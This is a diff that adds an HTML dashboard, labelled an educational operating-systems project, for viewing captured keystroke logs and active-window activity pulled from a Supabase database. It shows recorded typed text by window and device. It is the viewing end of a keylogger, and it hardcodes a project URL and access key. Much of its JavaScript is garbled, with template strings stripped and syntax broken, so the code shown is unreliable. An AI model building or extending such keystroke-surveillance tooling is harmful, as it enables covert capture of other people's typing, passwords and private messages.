@@ -1,0 +1,894 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Enhanced Educational Monitor Dashboard</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            color: #333;
+        }
+
+        .header {
+            background: rgba(255, 255, 255, 0.95);
+            padding: 20px;
+            text-align: center;
+            box-shadow: 0 2px 20px rgba(0, 0, 0, 0.1);
+            backdrop-filter: blur(10px);
+        }
+
+        .header h1 {
+            color: #2c3e50;
+            font-size: 2.5em;
+            margin-bottom: 10px;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.1);
+        }
+
+        .header .subtitle {
+            color: #7f8c8d;
+            font-size: 1.1em;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 30px auto;
+            padding: 0 20px;
+        }
+
+        .status-bar {
+            background: rgba(255, 255, 255, 0.9);
+            padding: 15px;
+            border-radius: 10px;
+            margin-bottom: 30px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+        }
+
+        .status-item {
+            text-align: center;
+        }
+
+        .status-value {
+            font-size: 2em;
+            font-weight: bold;
+            color: #3498db;
+        }
+
+        .status-label {
+            color: #7f8c8d;
+            font-size: 0.9em;
+            margin-top: 5px;
+        }
+
+        .dashboard-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 30px;
+            margin-bottom: 30px;
+        }
+
+        @media (max-width: 768px) {
+            .dashboard-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        .panel {
+            background: rgba(255, 255, 255, 0.95);
+            border-radius: 15px;
+            padding: 25px;
+            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.1);
+            backdrop-filter: blur(10px);
+        }
+
+        .panel-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+            padding-bottom: 15px;
+            border-bottom: 2px solid #ecf0f1;
+        }
+
+        .panel-title {
+            font-size: 1.5em;
+            color: #2c3e50;
+            font-weight: 600;
+        }
+
+        .refresh-btn {
+            background: linear-gradient(45deg, #3498db, #2980b9);
+            color: white;
+            border: none;
+            padding: 8px 15px;
+            border-radius: 20px;
+            cursor: pointer;
+            font-size: 0.9em;
+            transition: all 0.3s ease;
+        }
+
+        .refresh-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(52, 152, 219, 0.4);
+        }
+
+        .log-container {
+            height: 400px;
+            overflow-y: auto;
+            border: 1px solid #bdc3c7;
+            border-radius: 8px;
+            padding: 15px;
+            background: #f8f9fa;
+        }
+
+        .log-entry {
+            background: white;
+            margin-bottom: 10px;
+            padding: 15px;
+            border-radius: 8px;
+            border-left: 4px solid #3498db;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.05);
+            transition: all 0.3s ease;
+        }
+
+        .log-entry:hover {
+            transform: translateX(5px);
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+        }
+
+        .log-entry.keystroke {
+            border-left-color: #e74c3c;
+        }
+
+        .log-entry.activity {
+            border-left-color: #27ae60;
+        }
+
+        .log-timestamp {
+            font-size: 0.8em;
+            color: #7f8c8d;
+            margin-bottom: 5px;
+        }
+
+        .log-content {
+            color: #2c3e50;
+            line-height: 1.4;
+        }
+
+        .log-meta {
+            font-size: 0.85em;
+            color: #95a5a6;
+            margin-top: 8px;
+            font-style: italic;
+        }
+
+        .loading {
+            text-align: center;
+            padding: 40px;
+            color: #7f8c8d;
+            font-size: 1.1em;
+        }
+
+        .error {
+            background: #e74c3c;
+            color: white;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        .success {
+            background: #27ae60;
+            color: white;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        .config-panel {
+            background: rgba(255, 255, 255, 0.9);
+            padding: 20px;
+            border-radius: 10px;
+            margin-bottom: 30px;
+        }
+
+        .config-row {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 15px;
+            align-items: center;
+        }
+
+        .config-input {
+            flex: 1;
+            padding: 10px;
+            border: 1px solid #bdc3c7;
+            border-radius: 5px;
+            font-size: 0.9em;
+        }
+
+        .config-status {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 1.1em;
+        }
+
+        .status-indicator {
+            font-size: 1.2em;
+        }
+
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 15px;
+            margin-top: 20px;
+        }
+
+        .stat-card {
+            background: linear-gradient(45deg, #f39c12, #e67e22);
+            color: white;
+            padding: 20px;
+            border-radius: 10px;
+            text-align: center;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+        }
+
+        .stat-number {
+            font-size: 2.5em;
+            font-weight: bold;
+            margin-bottom: 5px;
+        }
+
+        .stat-label {
+            font-size: 0.9em;
+            opacity: 0.9;
+        }
+
+        .auto-refresh {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 0.9em;
+            color: #7f8c8d;
+        }
+
+        .switch {
+            position: relative;
+            display: inline-block;
+            width: 50px;
+            height: 24px;
+        }
+
+        .switch input {
+            opacity: 0;
+            width: 0;
+            height: 0;
+        }
+
+        .slider {
+            position: absolute;
+            cursor: pointer;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-color: #ccc;
+            transition: .4s;
+            border-radius: 24px;
+        }
+
+        .slider:before {
+            position: absolute;
+            content: "";
+            height: 18px;
+            width: 18px;
+            left: 3px;
+            bottom: 3px;
+            background-color: white;
+            transition: .4s;
+            border-radius: 50%;
+        }
+
+        input:checked + .slider {
+            background-color: #3498db;
+        }
+
+        input:checked + .slider:before {
+            transform: translateX(26px);
+        }
+
+        .filter-bar {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 20px;
+            flex-wrap: wrap;
+        }
+
+        .filter-btn {
+            background: #ecf0f1;
+            border: none;
+            padding: 8px 15px;
+            border-radius: 20px;
+            cursor: pointer;
+            font-size: 0.9em;
+            transition: all 0.3s ease;
+        }
+
+        .filter-btn.active {
+            background: #3498db;
+            color: white;
+        }
+
+        .filter-btn:hover {
+            background: #d5dbdb;
+        }
+
+        .log-type-badge {
+            padding: 2px 8px;
+            border-radius: 12px;
+            font-size: 0.75em;
+            font-weight: bold;
+            text-transform: uppercase;
+        }
+
+        .log-type-badge.keystroke {
+            background: #e74c3c;
+            color: white;
+        }
+
+        .log-type-badge.activity {
+            background: #27ae60;
+            color: white;
+        }
+
+        .device-info, .stat-info, .handle-info {
+            display: inline-flex;
+            align-items: center;
+            gap: 4px;
+        }
+
+        .no-data {
+            text-align: center;
+            padding: 40px;
+            color: #95a5a6;
+            font-style: italic;
+            background: #f8f9fa;
+            border-radius: 8px;
+            margin: 20px 0;
+        }
+
+        .connection-status {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 0.9em;
+            margin-top: 10px;
+        }
+
+        .status-dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: #e74c3c;
+            animation: pulse 2s infinite;
+        }
+
+        .status-dot.connected {
+            background: #27ae60;
+        }
+
+        @keyframes pulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.5; }
+            100% { opacity: 1; }
+        }
+
+        .refresh-all-btn {
+            background: linear-gradient(45deg, #8e44ad, #9b59b6);
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 25px;
+            cursor: pointer;
+            font-size: 1em;
+            font-weight: 600;
+            margin: 20px auto;
+            display: block;
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .refresh-all-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 25px rgba(142, 68, 173, 0.4);
+        }
+
+        .error-details {
+            background: #fff5f5;
+            border: 1px solid #fed7d7;
+            color: #c53030;
+            padding: 15px;
+            border-radius: 8px;
+            margin: 10px 0;
+            font-family: 'Courier New', monospace;
+            font-size: 0.85em;
+            white-space: pre-wrap;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1>ðŸ–¥ï¸ Enhanced Educational Monitor</h1>
+        <div class="subtitle">University Operating Systems Project - Real-time Activity & Keystroke Dashboard</div>
+    </div>
+
+    <div class="container">
+        <!-- Status Bar -->
+        <div class="status-bar">
+            <div class="status-item">
+                <div class="status-value" id="totalLogs">0</div>
+                <div class="status-label">Total Logs</div>
+            </div>
+            <div class="status-item">
+                <div class="status-value" id="keystrokeLogs">0</div>
+                <div class="status-label">Keystroke Logs</div>
+            </div>
+            <div class="status-item">
+                <div class="status-value" id="activityLogs">0</div>
+                <div class="status-label">Activity Logs</div>
+            </div>
+            <div class="status-item">
+                <div class="status-value" id="lastUpdate">Never</div>
+                <div class="status-label">Last Update</div>
+            </div>
+        </div>
+
+        <!-- Configuration Status -->
+        <div class="config-panel">
+            <h3>Configuration Status</h3>
+            <div class="config-row">
+                <div class="config-status" id="configStatus">
+                    <span class="status-indicator" id="statusIndicator">ðŸ”´</span>
+                    <span id="statusText">Checking configuration...</span>
+                </div>
+                <div class="connection-status">
+                    <div class="status-dot" id="connectionDot"></div>
+                    <span id="connectionText">Connecting...</span>
+                </div>
+            </div>
+            <button class="refresh-all-btn" onclick="loadAllData()">ðŸ”„ Refresh All Data</button>
+            <div class="auto-refresh">
+                <label class="switch">
+                    <input type="checkbox" id="autoRefresh" checked>
+                    <span class="slider"></span>
+                </label>
+                <span>Auto-refresh every 5 seconds</span>
+            </div>
+        </div>
+
+        <!-- Statistics Cards -->
+        <div class="stats-grid">
+            <div class="stat-card">
+                <div class="stat-number" id="todayKeystokes">0</div>
+                <div class="stat-label">Today's Keystrokes</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number" id="activeApps">0</div>
+                <div class="stat-label">Active Applications</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number" id="totalSessions">0</div>
+                <div class="stat-label">Recording Sessions</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number" id="avgSessionLength">0s</div>
+                <div class="stat-label">Avg Session Length</div>
+            </div>
+        </div>
+
+        <!-- Main Dashboard Grid -->
+        <div class="dashboard-grid">
+            <!-- Keystroke Logs Panel -->
+            <div class="panel">
+                <div class="panel-header">
+                    <h3 class="panel-title">ðŸ”¤ Keystroke Logs</h3>
+                    <button class="refresh-btn" onclick="loadKeystrokeLogs()">Refresh</button>
+                </div>
+                <div class="filter-bar">
+                    <button class="filter-btn active" onclick="filterLogs('keystroke', 'all')">All</button>
+                    <button class="filter-btn" onclick="filterLogs('keystroke', 'today')">Today</button>
+                    <button class="filter-btn" onclick="filterLogs('keystroke', 'recent')">Last Hour</button>
+                </div>
+                <div class="log-container" id="keystrokeLogs">
+                    <div class="loading">Loading keystroke logs...</div>
+                </div>
+            </div>
+
+            <!-- Activity Logs Panel -->
+            <div class="panel">
+                <div class="panel-header">
+                    <h3 class="panel-title">ðŸ–±ï¸ Activity Logs</h3>
+                    <button class="refresh-btn" onclick="loadActivityLogs()">Refresh</button>
+                </div>
+                <div class="filter-bar">
+                    <button class="filter-btn active" onclick="filterLogs('activity', 'all')">All</button>
+                    <button class="filter-btn" onclick="filterLogs('activity', 'today')">Today</button>
+                    <button class="filter-btn" onclick="filterLogs('activity', 'recent')">Last Hour</button>
+                </div>
+                <div class="log-container" id="activityLogs">
+                    <div class="loading">Loading activity logs...</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Combined Timeline View -->
+        <div class="panel">
+            <div class="panel-header">
+                <h3 class="panel-title">ðŸ“Š Combined Timeline</h3>
+                <button class="refresh-btn" onclick="loadCombinedTimeline()">Refresh</button>
+            </div>
+            <div class="log-container" id="combinedTimeline">
+                <div class="loading">Loading combined timeline...</div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Configuration - automatically loaded from PowerShell script
+        let config = {
+            supabaseUrl: 'https://vxevbehqnjhqodybymto.supabase.co',
+            supabaseKey: 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InZ4ZXZiZWhxbmpocW9keWJ5bXRvIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDg5NTYzNDYsImV4cCI6MjA2NDUzMjM0Nn0.BHAltakl2-UqwFjMFvKJYIWw9NcZ064N5BWt1Z6uyiE',
+            autoRefresh: true,
+            refreshInterval: 5000
+        };
+
+        let refreshTimer;
+        let currentFilters = {
+            keystroke: 'all',
+            activity: 'all'
+        };
+
+        // Initialize dashboard
+        document.addEventListener('DOMContentLoaded', function() {
+            checkConfiguration();
+            initializeAutoRefresh();
+            loadAllData();
+        });
+
+        function checkConfiguration() {
+            const statusIndicator = document.getElementById('statusIndicator');
+            const statusText = document.getElementById('statusText');
+            
+            if (config.supabaseUrl && config.supabaseKey) {
+                statusIndicator.textContent = 'ðŸŸ¢';
+                statusText.textContent = 'Configuration loaded from config.ps1 - Ready';
+                statusText.style.color = '#27ae60';
+            } else {
+                statusIndicator.textContent = 'ðŸ”´';
+                statusText.textContent = 'Configuration missing - Check config.ps1';
+                statusText.style.color = '#e74c3c';
+            }
+        }
+
+        function initializeAutoRefresh() {
+            const autoRefreshToggle = document.getElementById('autoRefresh');
+            autoRefreshToggle.addEventListener('change', function() {
+                config.autoRefresh = this.checked;
+                if (config.autoRefresh) {
+                    startAutoRefresh();
+                } else {
+                    stopAutoRefresh();
+                }
+            });
+
+            if (config.autoRefresh) {
+                startAutoRefresh();
+            }
+        }
+
+        function startAutoRefresh() {
+            stopAutoRefresh();
+            refreshTimer = setInterval(loadAllData, config.refreshInterval);
+        }
+
+        function stopAutoRefresh() {
+            if (refreshTimer) {
+                clearInterval(refreshTimer);
+            }
+        }
+
+        async function makeSupabaseRequest(table, filter = '') {
+            if (!config.supabaseUrl || !config.supabaseKey) {
+                throw new Error('Supabase configuration not set');
+            }
+
+            const url = ${config.supabaseUrl}/rest/v1/;
+            const response = await fetch(url, {
+                headers: {
+                    'apikey': config.supabaseKey,
+                    'Authorization': Bearer ,
+                    'Content-Type': 'application/json'
+                }
+            });
+
+            if (!response.ok) {
+                throw new Error(HTTP error! status: );
+            }
+
+            return await response.json();
+        }
+
+        async function loadKeystrokeLogs() {
+            try {
+                document.getElementById('keystrokeLogs').innerHTML = '<div class="loading">ðŸ”„ Loading keystroke logs...</div>';
+                
+                let filter = 'order=timestamp.desc&limit=50';
+                
+                if (currentFilters.keystroke === 'today') {
+                    const today = new Date().toISOString().split('T')[0];
+                    filter += &timestamp=gte.T00:00:00;
+                } else if (currentFilters.keystroke === 'recent') {
+                    const oneHourAgo = new Date(Date.now() - 3600000).toISOString();
+                    filter += &timestamp=gte.;
+                }
+
+                const logs = await makeSupabaseRequest('key_logs', filter);
+                displayKeystrokeLogs(logs);
+                updateKeystrokeStats(logs);
+                showConnectionStatus(true);
+            } catch (error) {
+                console.error('Keystroke logs error:', error);
+                document.getElementById('keystrokeLogs').innerHTML = 
+                    <div class="error">âŒ Error loading keystroke logs
+                     <div class="error-details"></div>
+                     <button class="refresh-btn" onclick="loadKeystrokeLogs()">ðŸ”„ Retry</button></div>;
+                showConnectionStatus(false);
+            }
+        }
+
+        async function loadActivityLogs() {
+            try {
+                document.getElementById('activityLogs').innerHTML = '<div class="loading">ðŸ”„ Loading activity logs...</div>';
+                
+                let filter = 'order=timestamp.desc&limit=50';
+                
+                if (currentFilters.activity === 'today') {
+                    const today = new Date().toISOString().split('T')[0];
+                    filter += &timestamp=gte.T00:00:00;
+                } else if (currentFilters.activity === 'recent') {
+                    const oneHourAgo = new Date(Date.now() - 3600000).toISOString();
+                    filter += &timestamp=gte.;
+                }
+
+                const logs = await makeSupabaseRequest('activity_logs', filter);
+                displayActivityLogs(logs);
+                updateActivityStats(logs);
+                showConnectionStatus(true);
+            } catch (error) {
+                console.error('Activity logs error:', error);
+                document.getElementById('activityLogs').innerHTML = 
+                    <div class="error">âŒ Error loading activity logs
+                     <div class="error-details"></div>
+                     <button class="refresh-btn" onclick="loadActivityLogs()">ðŸ”„ Retry</button></div>;
+                showConnectionStatus(false);
+            }
+        }
+
+        async function loadCombinedTimeline() {
+            try {
+                const [keystrokeLogs, activityLogs] = await Promise.all([
+                    makeSupabaseRequest('key_logs', 'order=timestamp.desc&limit=25'),
+                    makeSupabaseRequest('activity_logs', 'order=timestamp.desc&limit=25')
+                ]);
+
+                const combinedLogs = [
+                    ...keystrokeLogs.map(log => ({...log, type: 'keystroke'})),
+                    ...activityLogs.map(log => ({...log, type: 'activity'}))
+                ].sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
+
+                displayCombinedTimeline(combinedLogs);
+            } catch (error) {
+                document.getElementById('combinedTimeline').innerHTML = 
+                    <div class="error">Error loading combined timeline: </div>;
+            }
+        }
+
+        function displayKeystrokeLogs(logs) {
+            const container = document.getElementById('keystrokeLogs');
+            
+            if (logs.length === 0) {
+                container.innerHTML = '<div class="loading">No keystroke logs found</div>';
+                return;
+            }
+
+            const html = logs.map(log => +""+
+                <div class="log-entry keystroke">
+                    <div class="log-timestamp">+""+${formatDateTime(log.timestamp)}</div>
+                    <div class="log-content">
+                        <strong>Window:</strong> +""+${escapeHtml(log.window_title || 'Unknown')}<br>
+                        <strong>Content:</strong> +""+${escapeHtml(log.keystrokes || '').substring(0, 200)}+""+${log.keystrokes && log.keystrokes.length > 200 ? '...' : ''}
+                    </div>
+                    <div class="log-meta">
+                        Device: +""+${escapeHtml(log.device_id || 'Unknown')} | 
+                        Characters: +""+${log.keystrokes ? log.keystrokes.length : 0}
+                    </div>
+                </div>
+            +""+).join('');
+
+            container.innerHTML = html;
+        }
+
+        function displayActivityLogs(logs) {
+            const container = document.getElementById('activityLogs');
+            
+            if (logs.length === 0) {
+                container.innerHTML = '<div class="loading">No activity logs found</div>';
+                return;
+            }
+
+            const html = logs.map(log => +""+
+                <div class="log-entry activity">
+                    <div class="log-timestamp">+""+${formatDateTime(log.timestamp)}</div>
+                    <div class="log-content">
+                        <strong>Application:</strong> +""+${escapeHtml(log.process_name || 'Unknown')}<br>
+                        <strong>Window:</strong> +""+${escapeHtml(log.window_title || 'Unknown')}
+                    </div>
+                    <div class="log-meta">
+                        Device: +""+${escapeHtml(log.device_id || 'Unknown')} | 
+                        Handle: +""+${log.window_handle || 'N/A'}
+                    </div>
+                </div>
+            +""+).join('');
+
+            container.innerHTML = html;
+        }
+
+        function displayCombinedTimeline(logs) {
+            const container = document.getElementById('combinedTimeline');
+            
+            if (logs.length === 0) {
+                container.innerHTML = '<div class="loading">No logs found</div>';
+                return;
+            }
+
+            const html = logs.map(log => +""+
+                <div class="log-entry +""+${log.type}">
+                    <div class="log-timestamp">+""+${formatDateTime(log.timestamp)} - +""+${log.type.toUpperCase()}</div>
+                    <div class="log-content">
+                        +""+${log.type === 'keystroke' ? 
+                            +""+<strong>Keystroke Session:</strong> +""+${escapeHtml(log.window_title || 'Unknown')}<br>
+                             <strong>Content:</strong> +""+${escapeHtml(log.keystrokes || '').substring(0, 150)}...+""+ :
+                            +""+<strong>Activity:</strong> +""+${escapeHtml(log.process_name || 'Unknown')}<br>
+                             <strong>Window:</strong> +""+${escapeHtml(log.window_title || 'Unknown')}+""+
+                        }
+                    </div>
+                    <div class="log-meta">
+                        Device: +""+${escapeHtml(log.device_id || 'Unknown')} | 
+                        +""+${log.type === 'keystroke' ? 
+                            +""+Characters: +""+${log.keystrokes ? log.keystrokes.length : 0}+""+ :
+                            +""+Handle: +""+${log.window_handle || 'N/A'}+""+
+                        }
+                    </div>
+                </div>
+            +""+).join('');
+
+            container.innerHTML = html;
+        }
+
+        function updateKeystrokeStats(logs) {
+            const today = new Date().toISOString().split('T')[0];
+            const todayLogs = logs.filter(log => log.timestamp.startsWith(today));
+            const totalKeystrokes = todayLogs.reduce((sum, log) => sum + (log.keystrokes ? log.keystrokes.length : 0), 0);
+            
+            document.getElementById('todayKeystokes').textContent = totalKeystrokes;
+            document.getElementById('keystrokeLogs').textContent = logs.length;
+        }
+
+        function updateActivityStats(logs) {
+            const uniqueApps = new Set(logs.map(log => log.process_name)).size;
+            document.getElementById('activeApps').textContent = uniqueApps;
+            document.getElementById('activityLogs').textContent = logs.length;
+        }
+
+        function showConnectionStatus(connected) {
+            const dot = document.getElementById('connectionDot');
+            const text = document.getElementById('connectionText');
+            
+            if (connected) {
+                dot.classList.add('connected');
+                text.textContent = 'Connected to Supabase';
+                text.style.color = '#27ae60';
+            } else {
+                dot.classList.remove('connected');
+                text.textContent = 'Connection Failed';
+                text.style.color = '#e74c3c';
+            }
+        }
+
+        function updateGeneralStats() {
+            const keystrokeCount = parseInt(document.getElementById('keystrokeLogs').textContent || 0);
+            const activityCount = parseInt(document.getElementById('activityLogs').textContent || 0);
+            const totalLogs = keystrokeCount + activityCount;
+            
+            document.getElementById('totalLogs').textContent = totalLogs;
+            document.getElementById('lastUpdate').textContent = new Date().toLocaleTimeString();
+            
+            // Update individual counters in status bar
+            document.getElementById('keystrokeLogs').textContent = keystrokeCount;
+            document.getElementById('activityLogs').textContent = activityCount;
+        }
+
+        function filterLogs(type, filter) {
+            currentFilters[type] = filter;
+            
+            // Update active button
+            const buttons = document.querySelectorAll(.panel:has(#Logs) .filter-btn);
+            buttons.forEach(btn => btn.classList.remove('active'));
+            event.target.classList.add('active');
+            
+            // Reload data
+            if (type === 'keystroke') {
+                loadKeystrokeLogs();
+            } else {
+                loadActivityLogs();
+            }
+        }
+
+        async function loadAllData() {
+            await Promise.all([
+                loadKeystrokeLogs(),
+                loadActivityLogs(),
+                loadCombinedTimeline()
+            ]);
+            updateGeneralStats();
+        }
+
+        function formatDateTime(timestamp) {
+            return new Date(timestamp).toLocaleString();
+        }
+
+        function escapeHtml(text) {
+            const div = document.createElement('div');
+            div.textContent = text;
+            return div.innerHTML;
+        }
+
+        function showMessage(message, type) {
+            const messageDiv = document.createElement('div');
+            messageDiv.className = type;
+            messageDiv.textContent = message;
+            
+            const container = document.querySelector('.container');
+            container.insertBefore(messageDiv, container.firstChild);
+            
+            setTimeout(() => {
+                messageDiv.remove();
+            }, 3000);
+        }
+
+        // Handle visibility change for performance
+        document.addEventListener('visibilitychange', function() {
+            if (document.hidden) {
+                stopAutoRefresh();
+            } else if (config.autoRefresh) {
+                startAutoRefresh();
+            }
+        });
+    </script>
+</body>
+</html>
